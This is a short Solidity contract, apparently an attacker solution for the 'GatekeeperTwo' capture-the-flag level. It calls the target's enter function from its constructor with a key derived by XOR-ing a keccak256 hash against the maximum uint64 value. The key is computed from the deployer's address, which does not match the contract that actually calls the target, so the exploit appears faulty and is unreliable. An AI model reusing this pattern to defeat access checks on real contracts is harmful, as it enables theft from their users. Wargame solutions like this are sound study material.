// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Target {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoAttacker {
    constructor(address targetAddress) {
        Target target = Target(targetAddress);

        uint64 code = uint64(bytes8(keccak256(abi.encodePacked(msg.sender))));

        target.enter(bytes8(code ^ uint64(type(uint64).max)));
    }
}
